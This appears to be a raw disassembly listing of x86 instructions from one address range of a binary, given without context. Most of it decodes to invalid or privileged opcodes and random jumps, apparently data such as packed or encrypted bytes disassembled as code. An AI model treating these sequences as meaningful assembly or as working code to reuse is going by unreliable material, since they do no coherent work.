  42bd35:	ror    DWORD PTR [ebx],1
  42bd37:	hlt    
  42bd38:	loop   0x42bd08
  42bd3a:	pop    es
  42bd3b:	add    bh,cl
  42bd3d:	(bad)  
  42bd3f:	call   0xd432a504
  42bd44:	(bad)  [ebx+esi*4-0x6391640]
  42bd4b:	lock mov ah,0xe1
  42bd4e:	ret    
  42bd4f:	mov    ebp,0xe3f4bd07
  42bd54:	hlt    
  42bd55:	fmulp  st(1),st
  42bd57:	in     al,0xc8
  42bd59:	add    DWORD PTR [edx+ecx*1],ecx
  42bd5c:	fdiv   st(2),st
  42bd5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bd5f:	scas   eax,DWORD PTR es:[edi]
  42bd60:	test   ebx,0xbac1e6b6
  42bd66:	jmp    0xceca:0xf5bfd7ea
  42bd6d:	shl    bh,cl
  42bd6f:	std    
  42bd70:	mov    eax,0xc2dcc2c3
  42bd75:	mov    esp,0xbfecafd
  42bd7a:	sti    
  42bd7b:	jmp    0x42bd88
  42bd7d:	out    0xcf,al
  42bd7f:	in     al,dx
  42bd80:	retf   0xc4c2
  42bd83:	repnz fcmovnbe st,st(2)
  42bd86:	(bad)  
  42bd87:	(bad)  
  42bd88:	in     eax,0xea
  42bd8a:	mov    edi,0xbcd2b8eb
  42bd8f:	out    dx,al
  42bd90:	ffreep st(0)
  42bd92:	aad    0xec
  42bd94:	stc    
  42bd95:	ffree  st(7)
  42bd97:	add    al,0x2
  42bd99:	add    eax,0xefe2e8dc
  42bd9e:	(bad)  
  42bd9f:	mov    esi,0xacccc0cb
  42bda4:	mov    ebx,0xf0f1eed9
  42bda9:	sar    DWORD PTR [ebp-0x31332524],1
  42bdaf:	(bad)  
  42bdb0:	mov    ecx,0xf2ffdbe3
  42bdb5:	std    
  42bdb6:	std    
  42bdb7:	fucom  st(6)
  42bdb9:	fmul   DWORD PTR [eax]
  42bdbb:	pop    es
  42bdbc:	or     ecx,edi
  42bdbe:	ret    
  42bdbf:	fmulp  st(0),st
  42bdc1:	(bad)  
  42bdc2:	out    0xe0,eax
  42bdc4:	loop   0x42bd7b
  42bdc6:	div    BYTE PTR [ecx+ecx*8-0xa460027]
  42bdcd:	std    
  42bdce:	mov    esp,0xccbed400
  42bdd3:	clc    
  42bdd4:	icebp  
  42bdd5:	add    eax,0x3ddf0c3
  42bdda:	fisttp DWORD PTR [edx+edx*1]
  42bddd:	retf   0xc8bd
  42bde0:	(bad)  
  42bde2:	lods   al,BYTE PTR ds:[esi]
  42bde3:	mov    dl,0xd2
  42bde5:	icebp  
  42bde6:	scas   eax,DWORD PTR es:[edi]
  42bde7:	jmp    0xbcf6a2c1
  42bdec:	aam    0xed
  42bdee:	repnz repnz cmc 
  42bdf1:	in     al,dx
  42bdf2:	fcom   st(5)
  42bdf4:	retf   
  42bdf5:	clc    
  42bdf6:	aam    0xea
  42bdf8:	enter  0xdbdc,0xc6
  42bdfc:	(bad)  
  42bdff:	test   eax,0xccedc6c3
  42be04:	test   eax,0xebcbcfac
  42be09:	mov    al,0xdb
  42be0b:	fmul   st(7),st
  42be0d:	in     eax,dx
  42be0e:	out    dx,al
  42be0f:	into   
  42be10:	out    dx,al
  42be11:	ret    0x601
  42be14:	ret    0x5da
  42be17:	neg    cl
  42be19:	or     bl,al
  42be1b:	(bad)  
  42be1d:	leave  
  42be1e:	repz rol ch,0xd3
  42be22:	lods   eax,DWORD PTR ds:[esi]
  42be23:	loop   0x42be0b
  42be25:	repz into 
  42be27:	(bad)  
  42be28:	jmp    0x42be21
  42be2a:	std    
  42be2b:	mov    edi,0xdbf3c9c3
  42be30:	xlat   BYTE PTR ds:[ebx]
  42be31:	(bad)
  42be35:	ffree  st(4)
  42be37:	fmul   DWORD PTR [edx]
  42be39:	enter  0xd8e6,0xe8
  42be3d:	adc    ah,ch
  42be3f:	jmp    0x42be0b
  42be41:	jmp    0xe9cc:0xc6cecfe5
  42be48:	out    dx,eax
  42be49:	sti    
  42be4a:	clc    
  42be4b:	mov    ebx,0xd0c8f4f9
  42be50:	cld    
  42be51:	(bad)  
  42be53:	pop    es
  42be54:	ret    
  42be55:	jecxz  0x42be1c
  42be57:	shr    al,0xe3
  42be5a:	or     ecx,ebx
  42be5c:	enter  0xf3e2,0xce
  42be60:	out    dx,al
  42be61:	repnz imul al
  42be64:	shr    eax,1
  42be66:	fmul   st,st(5)
  42be68:	fucomip st,st(1)
  42be6a:	mov    ch,0xf6
  42be6c:	mov    edx,0xdbd5d2ba
  42be71:	repz loopne 0x42be68
  42be74:	loop   0x42be61
  42be76:	shr    edx,0x2
  42be79:	retf   
  42be7a:	out    dx,al
  42be7b:	clc    
  42be7c:	clc    
  42be7d:	fxch   st(0)
  42be7f:	fmul   st,st(5)
  42be81:	rol    dh,1
  42be83:	lods   al,BYTE PTR ds:[esi]
  42be84:	mov    ah,0xf3
  42be86:	in     eax,0xb2
  42be88:	(bad)  
  42be89:	into   
  42be8a:	in     al,0xf9
  42be8c:	test   ebx,0xdbc1c3bc
  42be92:	in     al,dx
  42be93:	loopne 0x42be6f
  42be95:	rcr    ecx,1
  42be97:	faddp  st(7),st
  42be99:	enter  0xedef,0xb
  42be9d:	in     al,dx
  42be9e:	sar    BYTE PTR [eax-0x4190e37],0xf6
  42bea5:	mov    dl,0xf7
  42bea7:	hlt    
  42bea8:	jmp    0xed358771
  42bead:	mov    ebx,0xf7f5fae9
  42beb2:	neg    bh
  42beb4:	(bad)  
  42beb5:	fdivrp st(1),st
  42beb7:	call   0xdc4bb3ba
  42bebc:	(bad)  
  42bebe:	fchs   
  42bec0:	repnz in al,dx
  42bec2:	scas   eax,DWORD PTR es:[edi]
  42bec3:	mov    dl,0xea
  42bec5:	mov    dh,0xf5
  42bec7:	xlat   BYTE PTR ds:[ebx]
  42bec8:	leave  
  42bec9:	shr    ah,cl
  42becb:	jecxz  0x42bea4
  42becd:	call   0xf812be8c
  42bed2:	loop   0x42be98
  42bed4:	aam    0xfc
  42bed6:	std    
  42bed7:	fsub   st(2),st
  42bed9:	out    dx,eax
  42beda:	add    eax,0xabe9fbfe
  42bedf:	ret    
  42bee0:	ret    
  42bee1:	(bad)  
  42bee2:	retf   0xe5aa
  42bee5:	mov    edx,0xd0d8ceb9
  42beea:	int    0xd8
  42beec:	mov    edx,0xbcdac2de
  42bef1:	jecxz  0x42bef2
  42bef3:	test   BYTE PTR [edx],0x4
  42bef6:	jmp    0xee09:0xe7d403c9
  42befd:	or     BYTE PTR [ebx-0x540d4058],ch
  42bf03:	iret   
  42bf04:	ret    0xd3f7
  42bf07:	fmul   st,st(0)
  42bf09:	int3   
  42bf0a:	sti    
  42bf0b:	call   0x3fd7eeb
  42bf10:	add    esi,esi
  42bf12:	fidivr WORD PTR [ebp-0x3a222a1a]
  42bf18:	leave  
  42bf19:	push   es
  42bf1a:	pop    es
  42bf1b:	adc    ebx,edx
  42bf1d:	cld    
  42bf1e:	out    dx,eax
  42bf1f:	xlat   BYTE PTR ds:[ebx]
  42bf20:	scas   al,BYTE PTR es:[edi]
  42bf21:	call   0xfc1671f5
  42bf26:	in     al,dx
  42bf27:	into   
  42bf28:	hlt    
  42bf29:	fucomp st(4)
  42bf2b:	int    0xea
  42bf2d:	test   ch,0xc2
  42bf30:	mul    esi
  42bf32:	add    al,0x7
  42bf34:	fild   WORD PTR [eax]
  42bf36:	push   es
  42bf37:	sti    
  42bf38:	add    cl,BYTE PTR [eax]
  42bf3a:	jmp    0x42bf25
  42bf3c:	fucom  st(7)
  42bf3e:	mov    bl,0xe8
  42bf40:	out    dx,eax
  42bf41:	mov    bh,0xf0
  42bf43:	(bad)  
  42bf44:	lods   al,BYTE PTR ds:[esi]
  42bf45:	aad    0xc7
  42bf47:	call   0xed2f9605
  42bf4c:	mov    edi,0xb5c3c3d4
  42bf51:	mov    ebp,0xe5e0d6e5
  42bf56:	fiadd  WORD PTR [ecx]
  42bf58:	fcmovu st,st(0)
  42bf5a:	bswap  ebx
  42bf5c:	repz out dx,eax
  42bf5e:	out    dx,al
  42bf5f:	call   0xc725b528
  42bf64:	jecxz  0x42bf1a
  42bf66:	enter  0xefb6,0xc5
  42bf6a:	rcl    ch,1
  42bf6c:	mov    cl,0xea
  42bf6e:	leave  
  42bf6f:	test   BYTE PTR [edx],0xb4
  42bf72:	int    0xe4
  42bf74:	(bad)  
  42bf75:	jecxz  0x42bf36
  42bf77:	hlt    
  42bf78:	or     esi,ebp
  42bf7a:	add    ecx,DWORD PTR [esi]
  42bf7c:	fst    st(2)
  42bf7e:	loopne 0x42bf69
  42bf80:	int    0xc2
  42bf82:	out    dx,al
  42bf83:	iret   
  42bf84:	mov    dl,0xee
  42bf86:	icebp  
  42bf87:	neg    ecx
  42bf89:	mov    dh,0xfc
  42bf8b:	mov    dl,0xeb
  42bf8d:	xlat   BYTE PTR ds:[ebx]
  42bf8e:	lock int 0xf1
  42bf91:	add    eax,0x4dbf3f4
  42bf96:	fcmovbe st,st(4)
  42bf98:	leave  
  42bf99:	sti    
  42bf9a:	hlt    
  42bf9b:	cld    
  42bf9c:	repz jmp 0x42bf7f
  42bf9f:	loop   0x42bf5d
  42bfa1:	in     al,0xe7
  42bfa3:	out    dx,al
  42bfa4:	mov    al,0xcc
  42bfa6:	(bad)  
  42bfa8:	fld    TBYTE PTR [edx+ebp*8-0x2303734]
  42bfaf:	lock fdivrp st(1),st
  42bfb2:	aad    0xe1
  42bfb4:	add    al,ch
  42bfb6:	jmp    0xc502:0x1c9d6f8
  42bfbd:	add    bh,ch
  42bfbf:	fdiv   st,st(3)
  42bfc1:	loopne 0x42bfb9
  42bfc3:	shr    cl,cl
  42bfc5:	fcmovnb st,st(6)
  42bfc7:	shl    bh,0xc8
  42bfca:	lock fstp TBYTE PTR [ecx-0x60d0101]
  42bfd1:	int    0xe0
  42bfd3:	in     al,0xd1
  42bfd5:	test   ebx,0xe0e3f7c4
  42bfdb:	out    0x4,eax
  42bfdd:	cli    
  42bfde:	call   0xd610a5d2
  42bfe3:	mov    bh,0xeb
  42bfe5:	mov    edx,0xd7bbe4f0
  42bfea:	(bad)  
  42bfec:	mov    esp,0x7d7d0ee
  42bff1:	pop    es
  42bff2:	idiv   ebx
  42bff4:	fsub   st,st(0)
  42bff6:	cld    
  42bff7:	or     bl,cl
  42bff9:	or     eax,0xcedacddc
  42bffe:	les    ebp,FWORD PTR [ecx-0x301e0a33]
  42c004:	(bad)  
  42c005:	stc    
  42c006:	shl    ch,0xeb
  42c009:	lods   al,BYTE PTR ds:[esi]
  42c00a:	mov    eax,0xcefed5fe
  42c00f:	out    0xff,eax
  42c011:	aam    0xf5
  42c013:	rol    al,1
  42c015:	jmp    0x42c022
  42c017:	leave  
  42c018:	test   BYTE PTR [esi],0xe2
  42c01b:	mov    BYTE PTR [esi],0xf9
  42c01e:	jmp    0x42bfe1
  42c020:	(bad)  
  42c021:	in     al,0xcf
  42c023:	repz int3 
  42c025:	mov    cl,0xd2
  42c028:	int    0xbb
  42c02a:	xlat   BYTE PTR ds:[ebx]
  42c02b:	mov    dl,0xc3
  42c02d:	stc    
  42c02e:	mov    edx,0xdafb06de
  42c033:	(bad)  
  42c034:	dec    BYTE PTR [ecx]
  42c036:	cmc    
  42c037:	stc    
  42c038:	aam    0xd6
  42c03a:	in     eax,dx
  42c03b:	(bad)  
  42c03d:	push   cs
  42c03e:	stos   BYTE PTR es:[edi],al
  42c03f:	(bad)  
  42c040:	repnz rol dl,0xd1
  42c044:	jmp    0xf7f9:0xb6d5bbf1
  42c04b:	shr    ah,cl
  42c04d:	call   ebp
  42c04f:	std    
  42c050:	rcr    cl,0xec
  42c053:	(bad)  
  42c054:	icebp  
  42c055:	jecxz  0x42c054
  42c057:	pop    es
  42c058:	pop    es
  42c059:	add    bh,bl
  42c05b:	in     al,dx
  42c05c:	out    dx,al
  42c05d:	or     al,0xdd
  42c05f:	repz lock ret 
  42c062:	int    0xc0
  42c064:	mov    bl,0xd5
  42c066:	les    esi,FWORD PTR [eax+ecx*8-0x805113c]
  42c06d:	loope  0x42c02b
  42c06f:	std    
  42c070:	(bad)  
  42c072:	sti    
  42c073:	rcr    dh,cl
  42c075:	rcr    eax,1
  42c077:	in     eax,0xd6
  42c079:	push   es
  42c07a:	or     eax,0xefe3cffd
  42c07f:	(bad)  
  42c080:	iret   
  42c081:	mov    bh,0xe6
  42c083:	shr    dh,cl
  42c085:	int    0xc8
  42c087:	sti    
  42c088:	repz retf 
  42c08a:	aam    0xd0
  42c08c:	fcomip st,st(0)
  42c08e:	out    dx,eax
  42c08f:	(bad)  
  42c091:	out    0xfe,eax
  42c093:	cmc    
  42c094:	rol    BYTE PTR [edx],1
  42c096:	fdivr  st,st(5)
  42c098:	neg    dh
  42c09a:	inc    edx
  42c09c:	std    
  42c09d:	fsubr  st,st(3)
  42c09f:	mov    bl,0xf6
  42c0a1:	ret    
  42c0a2:	jecxz  0x42c066
  42c0a4:	jmp    0xfb10747c
  42c0a9:	iret   
  42c0aa:	out    dx,al
  42c0ab:	(bad)  
  42c0ac:	stc    
  42c0ad:	aam    0xba
  42c0af:	stc    
  42c0b0:	int    0xf3
  42c0b2:	(bad)  
  42c0b4:	in     al,0xf8
  42c0b6:	sar    bh,0xea
  42c0b9:	push   cs
  42c0ba:	out    0xca,eax
  42c0bc:	add    ecx,ebp
  42c0be:	mov    cl,0xe6
  42c0c0:	fucomp st(6)
  42c0c2:	retf   
  42c0c3:	out    dx,al
  42c0c4:	out    dx,al
  42c0c5:	mov    al,0xd3
  42c0c7:	mov    edi,0xb9ffbdb9
  42c0cd:	mov    ebp,0xd2bdfbf2
  42c0d2:	rcl    al,0xbc
  42c0d5:	mov    esp,0xda06c1d4
  42c0da:	jmp    0x42c0db
  42c0dc:	add    eax,0xafc8e1cf
  42c0e1:	enter  0xb6ac,0xfb
  42c0e5:	in     eax,0xed
  42c0e7:	jmp    0x3296e3
  42c0ec:	mov    cl,0xf4
  42c0ee:	mov    eax,0xd1bfb6
  42c0f3:	pop    es
  42c0f4:	rcl    edi,cl
  42c0f6:	add    ah,bl
  42c0f8:	out    dx,al
  42c0f9:	fsub   st,st(0)
  42c0fb:	loop   0x42c0d9
  42c0fd:	or     esi,DWORD PTR [ecx-0x391d5039]
  42c103:	hlt    
  42c104:	in     al,dx
  42c105:	ret    0xf3e8
  42c108:	out    0xd7,al
  42c10a:	div    DWORD PTR [ebp-0x2017271e]
  42c110:	pop    es
  42c111:	repz ror BYTE PTR [ebx],1
  42c114:	test   DWORD PTR [edi],0xc6e6e1f7
  42c11a:	call   0xa851aa02
  42c11f:	scas   eax,DWORD PTR es:[edi]
  42c120:	(bad)  
  42c121:	in     al,dx
  42c122:	(bad)  
  42c123:	ror    dh,1
  42c125:	vpsubq ymm7,ymm2,ymm0
  42c129:	mov    eax,0xfdbdf9d2
  42c12e:	ret    
  42c12f:	rol    al,cl
  42c131:	clc    
  42c132:	inc    DWORD PTR [esi]
  42c134:	add    esp,eax
  42c136:	retf   
  42c137:	in     al,0xda
  42c139:	(bad)  
  42c13a:	loop   0x42c14b
  42c13c:	adc    ch,al
  42c13e:	int3   
  42c13f:	out    dx,eax
  42c140:	out    0xcb,eax
  42c142:	ror    eax,0xa9
  42c145:	(bad)  
  42c146:	jmp    0x42c12c
  42c148:	retf   
  42c149:	fnstsw WORD PTR [esi-0x44152c0a]
  42c14f:	loope  0x42c133
  42c151:	loopne 0x42c114
  42c153:	(bad)  
  42c154:	out    0xf0,eax
  42c156:	les    ecx,FWORD PTR [edx]
  42c158:	loopne 0x42c142
  42c15a:	clc    
  42c15b:	fcmove st,st(0)
  42c15d:	rcr    ecx,cl
  42c15f:	ret    0xada8
  42c162:	cmc    
  42c163:	fcomi  st,st(7)
  42c165:	mov    edx,0xfebbb5cd
  42c16a:	aad    0xca
  42c16c:	enter  0xfef5,0xe2
  42c170:	lock out dx,al
  42c172:	test   DWORD PTR [eiz*8-0x212f10],0xf90ecf07
  42c17d:	into   
  42c17e:	in     eax,0xbe
  42c180:	fadd   st(1),st
  42c182:	in     al,dx
  42c183:	stos   BYTE PTR es:[edi],al
  42c184:	mov    al,0xd3
  42c186:	rcr    dl,0xb8
  42c189:	call   0xb90da147
  42c18e:	int    0xd4
  42c190:	stc    
  42c191:	(bad)  
  42c192:	div    ecx
  42c194:	cli    
  42c195:	aad    0xe1
  42c197:	aam    0x0
  42c199:	out    dx,eax
  42c19a:	retf   
  42c19b:	pop    es
  42c19c:	or     eax,esp
  42c19e:	out    0xae,al
  42c1a0:	in     eax,0xe8
  42c1a2:	in     eax,dx
  42c1a3:	(bad)  
  42c1a4:	out    dx,eax
  42c1a5:	aad    0xb1
  42c1a7:	out    dx,eax
  42c1a8:	in     al,0xf9
  42c1aa:	(bad)  
  42c1ac:	icebp  
  42c1ad:	(bad)  
  42c1af:	sar    ah,0xed
  42c1b2:	vpmulhw ymm0,ymm4,ymm1
  42c1b6:	or     ah,dh
  42c1b8:	add    ecx,esp
  42c1ba:	fdiv   st(7),st
  42c1bc:	out    0xb,al
  42c1be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c1bf:	mov    esp,0xd5e4deef
  42c1c4:	mov    bl,0xac
  42c1c6:	jmp    0xd507af86
  42c1cb:	aad    0xf7
  42c1cd:	sti    
  42c1ce:	repz rcl bh,cl
  42c1d1:	repz cld 
  42c1d3:	rcr    cl,cl
  42c1d5:	pop    es
  42c1d6:	or     bl,bh
  42c1d8:	out    dx,eax
  42c1d9:	in     eax,dx
  42c1da:	(bad)  
  42c1dc:	loop   0x42c1ba
  42c1de:	repnz enter 0xd3f2,0xc0
  42c1e3:	mov    ch,0xc0
  42c1e5:	fcmovne st,st(5)
  42c1e7:	leave  
  42c1e8:	(bad)  
  42c1e9:	call   0xf0fc8cc9
  42c1ee:	in     eax,dx
  42c1ef:	sar    al,cl
  42c1f1:	shl    bh,cl
  42c1f3:	(bad)  
  42c1f5:	in     al,0x9
  42c1f7:	shr    ecx,0xa
  42c1fa:	paddsb mm1,QWORD PTR [esi]
  42c1fd:	dec    bl
  42c1ff:	shl    eax,cl
  42c201:	mov    bh,0xc2
  42c203:	(bad)  
  42c204:	retf   0xc0db
  42c207:	fldcw  WORD PTR [ebp-0x442d4208]
  42c20d:	loop   0x42c1d7
  42c20f:	fdiv   st,st(6)
  42c211:	add    DWORD PTR [esi],eax
  42c213:	shl    dl,1
  42c215:	neg    ch
  42c217:	stc    
  42c218:	push   cs
  42c219:	sar    bh,0xef
  42c21c:	or     al,0xdd
  42c21e:	(bad)  
  42c21f:	shr    ebx,cl
  42c221:	retf   0xe8e8
  42c224:	jecxz  0x42c210
  42c226:	int    0xd9
  42c228:	fcmovnbe st,st(2)
  42c22a:	leave  
  42c22b:	xlat   BYTE PTR ds:[ebx]
  42c22c:	mov    ah,0xe1
  42c22e:	mov    bh,0xed
  42c230:	shl    esi,cl
  42c232:	icebp  
  42c233:	(bad)  
  42c234:	pop    es
  42c235:	add    eax,0xcedbc409
  42c23a:	add    bh,bh
  42c23c:	in     al,dx
  42c23d:	add    al,0xb8
  42c23f:	out    dx,al
  42c240:	ret    0xcbd5
  42c243:	int3   
  42c244:	cli    
  42c245:	shl    dh,0xf8
  42c248:	idiv   BYTE PTR [ebx-0x62a3025]
  42c24e:	sar    DWORD PTR [edx-0x29fc2c3d],cl
  42c254:	repnz retf 
  42c256:	retf   
  42c257:	sti    
  42c258:	fsubr  st(4),st
  42c25a:	jecxz  0x42c26a
  42c25c:	or     al,ah
  42c25e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c25f:	shr    ebx,0xf5
  42c262:	mov    dl,0xad
  42c264:	jmp    0xcf1ea72b
  42c269:	enter  0xd8dd,0xe2
  42c26d:	(bad)  
  42c26f:	into   
  42c270:	add    edi,esp
  42c272:	inc    edi
  42c274:	rol    BYTE PTR ds:0xddd60004,1
  42c27a:	leave  
  42c27b:	in     al,dx
  42c27c:	stc    
  42c27d:	ror    ecx,cl
  42c27f:	fdiv   QWORD PTR [edi-0x100c0f42]
  42c285:	shr    eax,0xd7
  42c288:	mov    ebx,0xebedd7ee
  42c28d:	rcl    esi,cl
  42c28f:	mov    eax,0xfe04c6d1
  42c294:	cmc    
  42c295:	xlat   BYTE PTR ds:[ebx]
  42c296:	add    cl,ch
  42c298:	leave  
  42c299:	out    dx,eax
  42c29a:	jmp    0x42c286
  42c29c:	in     eax,dx
  42c29d:	(bad)  
  42c29e:	mov    eax,0xc3e2c3af
  42c2a3:	in     eax,dx
  42c2a4:	iret   
  42c2a5:	retf   0xf8e9
  42c2a8:	out    0xed,al
  42c2aa:	shl    BYTE PTR [ebx+edi*8+0x3fab7bc],1
  42c2b1:	std    
  42c2b2:	fcmovnu st,st(7)
  42c2b4:	(bad)  
  42c2b5:	dec    dl
  42c2b7:	(bad)  
  42c2b9:	fsubr  st(6),st
  42c2bb:	out    0xcf,al
  42c2bd:	or     al,0xb1
  42c2bf:	jmp    0xe129ae89
  42c2c4:	(bad)  
  42c2c5:	int3   
  42c2c6:	loope  0x42c28d
  42c2c8:	(bad)  
  42c2c9:	repnz retf 
  42c2cb:	(bad)  
  42c2cc:	hlt    
  42c2cd:	loop   0x42c2d2
  42c2cf:	pop    es
  42c2d0:	lock fmul st,st(4)
  42c2d3:	fiadd  WORD PTR [eax]
  42c2d5:	hlt    
  42c2d6:	or     ebx,esi
  42c2d8:	fmul   st(0),st
  42c2da:	jecxz  0x42c2dc
  42c2dc:	inc    BYTE PTR [esi]
  42c2de:	repnz retf 
  42c2e0:	rcr    dh,0xb2
  42c2e3:	loop   0x42c2d8
  42c2e5:	not    edx
  42c2e7:	jmp    0xe04077a7
  42c2ec:	retf   0xd6ba
  42c2ef:	out    0xc1,eax
  42c2f1:	rcl    esi,1
  42c2f3:	rcr    cl,cl
  42c2f5:	shl    dl,1
  42c2f7:	push   es
  42c2f8:	add    ebp,ebx
  42c2fa:	aam    0xfc
  42c2fc:	out    dx,al
  42c2fd:	out    0xbf,al
  42c2ff:	shl    ebx,cl
  42c301:	(bad)  
  42c302:	ror    edx,1
  42c304:	out    0xea,al
  42c306:	iret   
  42c307:	out    0xf9,al
  42c309:	out    dx,eax
  42c30a:	mov    ah,0xda
  42c30c:	in     al,dx
  42c30d:	into   
  42c30e:	ret    0xd7
  42c311:	ret    0xd9fd
  42c314:	div    cl
  42c316:	fld    st(7)
  42c318:	cld    
  42c319:	cli    
  42c31a:	out    dx,al
  42c31b:	(bad)  
  42c31d:	add    edx,ebx
  42c31f:	repz scas eax,DWORD PTR es:[edi]
  42c321:	in     eax,0xc4
  42c323:	iret   
  42c324:	in     eax,0xe9
  42c326:	fldl2t 
  42c328:	clc    
  42c329:	mov    esi,0xf4e3dac5
  42c32e:	aad    0xbe
  42c330:	mov    ch,0xe2
  42c332:	fiadd  DWORD PTR [eax]
  42c334:	add    dh,ah
  42c336:	dec    ecx
  42c338:	jmp    esp
  42c33a:	fdiv   st,st(3)
  42c33c:	shr    eax,0xd0
  42c33f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c340:	(bad)  
  42c341:	xlat   BYTE PTR ds:[ebx]
  42c342:	lods   eax,DWORD PTR ds:[esi]
  42c343:	lds    esi,FWORD PTR [ebx-0x122a1206]
  42c349:	clc    
  42c34a:	fdivr  st(3),st
  42c34c:	mov    esi,0xc2ccecf8
  42c351:	idiv   ecx
  42c353:	(bad)  
  42c354:	out    0xdc,al
  42c356:	(bad)  
  42c357:	out    dx,eax
  42c358:	add    eax,0xeeffff06
  42c35d:	loop   0x42c317
  42c35f:	test   al,0xd2
  42c361:	jecxz  0x42c323
  42c363:	(bad)  
  42c364:	in     al,dx
  42c365:	icebp  
  42c366:	test   dh,0xf1
  42c369:	mov    esi,0xdfd8d7eb
  42c36e:	call   0x3459265
  42c373:	in     eax,0xfc
  42c375:	add    al,0xe6
  42c377:	rcr    al,0x6
  42c37a:	iret   
  42c37b:	loop   0x42c383
  42c37d:	or     bh,BYTE PTR [edi+eax*8-0x3e4c220d]
  42c384:	out    0xc0,eax
  42c386:	mov    dh,0xdf
  42c388:	sar    esi,1
  42c38a:	in     al,0xbb
  42c38c:	out    dx,eax
  42c38d:	(bad)  
  42c38f:	ret    
  42c390:	(bad)  
  42c392:	mov    DWORD PTR [edi],0xac7c6e5
  42c398:	sti    
  42c399:	leave  
  42c39a:	out    0xa,al
  42c39c:	int    0xc4
  42c39e:	lods   al,BYTE PTR ds:[esi]
  42c39f:	test   al,0xcc
  42c3a1:	(bad)  
  42c3a3:	leave  
  42c3a4:	out    dx,eax
  42c3a5:	(bad)  
  42c3a7:	mov    al,0xd2
  42c3a9:	iret   
  42c3aa:	(bad)  
  42c3ab:	int3   
  42c3ac:	fdivrp st(5),st
  42c3ae:	fucom  st(7)
  42c3b0:	aam    0xf7
  42c3b2:	div    ah
  42c3b4:	in     eax,0xd2
  42c3b6:	loop   0x42c379
  42c3b8:	(bad)  
  42c3b9:	in     eax,dx
  42c3ba:	(bad)  
  42c3bc:	or     eax,0xcfe9a801
  42c3c1:	fsubrp st(0),st
  42c3c3:	repnz mov bl,0xcf
  42c3c6:	mov    bh,0xf7
  42c3c9:	out    0xe5,al
  42c3cb:	mov    dh,0xf1
  42c3cd:	std    
  42c3ce:	mul    ebx
  42c3d0:	aam    0xd1
  42c3d2:	rol    ebx,1
  42c3d4:	loop   0x42c3a1
  42c3d6:	add    al,0x0
  42c3d8:	rol    BYTE PTR [esi],0xe6
  42c3db:	in     al,0xce
  42c3dd:	or     ecx,esi
  42c3df:	retf   
  42c3e0:	(bad)
  42c3e3:	iret   
  42c3e4:	in     eax,0xd9
  42c3e6:	clc    
  42c3e7:	stc    
  42c3e8:	in     eax,dx
  42c3e9:	fdiv   st,st(7)
  42c3eb:	iret   
  42c3ec:	cld    
  42c3ed:	hlt    
  42c3ee:	cli    
  42c3ef:	mov    dh,0xf1
  42c3f1:	add    ah,bh
  42c3f3:	(bad)
  42c3f6:	leave  
  42c3f7:	or     edi,DWORD PTR [ebp-0x33f10322]
  42c3fd:	fstp   st(7)
  42c3ff:	shl    eax,cl
  42c401:	loope  0x42c3b3
  42c403:	(bad)  
  42c404:	in     al,dx
  42c405:	(bad)  
  42c406:	ror    ebp,cl
  42c408:	out    0xba,eax
  42c40a:	jmp    0xd619acdd
  42c40f:	in     eax,dx
  42c410:	add    dl,dh
  42c412:	push   es
  42c413:	mov    edx,0xaded6df
  42c418:	in     eax,0xe5
  42c41a:	vpsubw ymm7,ymm2,ymm0
  42c41e:	iret   
  42c41f:	leave  
  42c420:	in     eax,dx
  42c421:	les    esi,FWORD PTR [edx-0x163f3c20]
  42c427:	mov    bh,0xb9
  42c429:	call   0xdf029118
  42c42e:	(bad)  
  42c430:	icebp  
  42c431:	loop   0x42c430
  42c433:	rol    BYTE PTR [edx],cl
  42c435:	ret    
  42c436:	loope  0x42c42c
  42c438:	in     al,0xf
  42c43a:	jmp    0xae0ecd25
  42c43f:	out    dx,eax
  42c440:	mov    dl,0xad
  42c442:	retf   0xe6f0
  42c445:	mov    dl,0xe0
  42c447:	int    0xb8
  42c449:	jmp    0xc2f7:0xd4fef7c8
  42c450:	rcr    ch,1
  42c452:	(bad)  
  42c453:	add    ebx,ebp
  42c455:	(bad)  
  42c456:	(bad)  
  42c458:	call   0x27d162
  42c45d:	loop   0x42c42a
  42c45f:	mov    esp,0xcbf5c1d7
  42c464:	ret    
  42c465:	hlt    
  42c466:	into   
  42c467:	in     al,0xf1
  42c469:	aam    0xd0
  42c46b:	jmp    0xdc1c8459
  42c470:	(bad)  
  42c472:	icebp  
  42c473:	clc    
  42c474:	icebp  
  42c475:	jmp    0xebff:0xea00e604
  42c47c:	or     al,0xf9
  42c47e:	fsub   st(7),st
  42c480:	fnsave [edi-0x1a4c532c]
  42c486:	in     eax,dx
  42c487:	shl    BYTE PTR [esi-0xa2c3218],cl
  42c48d:	cmc    
  42c48e:	add    ecx,eax
  42c490:	mov    ebp,0xe0f302ce
  42c495:	cli    
  42c496:	jmp    0xd619c399
  42c49b:	in     al,0xe9
  42c49d:	add    ecx,esi
  42c49f:	leave  
  42c4a0:	(bad)  
  42c4a1:	out    dx,al
  42c4a2:	out    dx,al
  42c4a3:	scas   al,BYTE PTR es:[edi]
  42c4a4:	in     al,0xf9
  42c4a6:	vpor   xmm4,xmm1,xmm5
  42c4aa:	retf   
  42c4ab:	repz mov edx,0xb5dfe3f7
  42c4b1:	icebp  
  42c4b2:	ret    
  42c4b3:	out    0xf3,eax
  42c4b5:	loop   0x42c488
  42c4b7:	lock iret 
  42c4b9:	leave  
  42c4ba:	jmp    0xe4b0:0xd1cb09dc
  42c4c1:	int3   
  42c4c2:	jmp    0xedfb:0xf2e4cebc
  42c4c9:	(bad)  
  42c4cb:	add    esi,eax
  42c4cd:	mov    ah,0xee
  42c4cf:	mov    eax,0xd603f9cf
  42c4d4:	out    0xf9,eax
  42c4d6:	xlat   BYTE PTR ds:[ebx]
  42c4d7:	(bad)  
  42c4d8:	std    
  42c4d9:	stc    
  42c4da:	push   cs
  42c4db:	jecxz  0x42c4c1
  42c4dd:	cli    
  42c4de:	scas   al,BYTE PTR es:[edi]
  42c4df:	loopne 0x42c4a7
  42c4e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c4e2:	loop   0x42c491
  42c4e4:	ret    
  42c4e5:	retf   
  42c4e6:	cli    
  42c4e7:	in     al,dx
  42c4e8:	mov    ch,0xee
  42c4ea:	mov    ch,0xce
  42c4ec:	sar    cl,cl
  42c4ee:	ret    
  42c4ef:	enter  0xeefd,0xcc
  42c4f3:	fcmovnb st,st(7)
